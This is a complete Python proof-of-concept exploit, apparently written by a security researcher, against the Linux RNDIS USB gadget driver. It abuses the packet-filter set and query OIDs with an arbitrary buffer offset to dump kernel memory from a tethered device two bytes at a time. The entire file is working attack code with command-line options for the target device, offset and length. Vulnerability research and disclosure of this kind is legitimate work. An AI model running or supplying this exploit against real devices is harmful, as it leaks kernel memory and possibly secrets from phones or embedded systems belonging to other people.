#!/usr/bin/python3

#
# Exploit RNDIS Gadget packet filter get/set oids
# to extract contents of kernel memory space.
#
# Since the packet filter is represented by
# uint16 we're dumping only two bytes at a
# cycle - the process is slow but effective.
#
# This script requires pyusb.
#
# https://github.com/szymonh
#

import argparse
import sys

import usb.core

from ctypes import Structure, c_uint32


RNDIS_OID_GEN_SUPPORTED_LIST = 0x00010101
RNDIS_OID_GEN_CURRENT_PACKET_FILTER = 0x0001010E


class RndisQueryMsg(Structure):
    _pack_ = 1
    _fields_ = [
        ('MessageType', c_uint32),
        ('MessageLength', c_uint32),
        ('RequestID', c_uint32),
        ('OID', c_uint32),
        ('InformationBufferLength', c_uint32),
        ('InformationBufferOffset', c_uint32),
        ('DeviceVcHandle', c_uint32)
    ]


class RndisSetMsg(Structure):
    _pack_ = 1
    _fields_ = [
        ('MessageType', c_uint32),
        ('MessageLength', c_uint32),
        ('RequestID', c_uint32),
        ('OID', c_uint32),
        ('InformationBufferLength', c_uint32),
        ('InformationBufferOffset', c_uint32),
        ('DeviceVcHandle', c_uint32)
    ]


def auto_int(val: str) -> int:
    '''Convert arbitrary string to integer
    Used as argparse type to automatically handle input with
    different base - decimal, octal, hex etc.
    '''
    return int(val, 0)


def parse_args() -> argparse.Namespace:
    '''Parse command line arguments

    '''
    parser = argparse.ArgumentParser(
        description='Sample exploit for RNDIS gadget class',
        epilog='enable usb tethering and find your device with lsubs'
    )

    parser.add_argument('-v', '--vid',  type=auto_int, required=True,
                        help='vendor id')
    parser.add_argument('-p', '--pid', type=auto_int, required=True,
                        help='product id')
    parser.add_argument('-l', '--length', type=auto_int, default=0xffff,
                        required=False, help='lenght')
    parser.add_argument('-o', '--offset', type=auto_int, default=0x00,
                        required=False, help='offset')

    return parser.parse_args()


def print_request(req_type, req, val, idx, length):
    '''Write control transfer request to stdout

    '''
    print('{0:02X} {1:02X} {2:04X} {3:04X} {4:04X} '.format(
        req_type, req, val, idx, length), end=' ')


def send_command(usbdev, payload):
    '''Send encapsulated command

    '''
    data = usbdev.ctrl_transfer(0x21, 0x00, 0x00, 0x00, payload)
    return data


def get_response(usbdev):
    '''Retrieve command response

    '''
    data = usbdev.ctrl_transfer(0xA1, 0x01, 0x00, 0x00, 4096)
    return data


def rndis_query(usbdev):
    '''Query RNDIS for current packet filter

    '''
    query = RndisQueryMsg()
    query.MessageType = 0x00000004
    query.RequestID = 0xDEADBEEF
    query.OID = RNDIS_OID_GEN_CURRENT_PACKET_FILTER
    query.InformationBufferLength = 0x00
    query.InformationBufferOffset = 0x00
    send_command(usbdev, bytearray(query))
    resp = get_response(usbdev)
    sys.stdout.buffer.write(resp[24:26])


def rndis_set(usbdev, offset):
    '''Set the RNDIS packet filter to a value at offset

    '''
    command = RndisSetMsg()
    command.MessageType = 0x00000005
    command.RequestID = 0xDEADBEEF
    command.OID = RNDIS_OID_GEN_CURRENT_PACKET_FILTER
    command.InformationBufferLength = 0x00
    command.InformationBufferOffset = offset
    send_command(usbdev, bytearray(command))
    get_response(usbdev)


def exploit(args: argparse.Namespace) -> None:
    '''Attempt exploit the RNDIS device

    '''
    usbdev = usb.core.find(idVendor=args.vid, idProduct=args.pid)
    if usbdev is None:
        print('Device not found, verify specified VID and PID')
        return

    for cfg in usbdev:
        for idx in range(cfg.bNumInterfaces):
            if usbdev.is_kernel_driver_active(idx):
                usbdev.detach_kernel_driver(idx)
    usbdev.set_configuration()


    for offset in range(args.offset, args.offset + args.length, 2):
        rndis_set(usbdev, offset)
        rndis_query(usbdev)


if __name__ == '__main__':
    '''Main script

    '''
    exploit(parse_args())
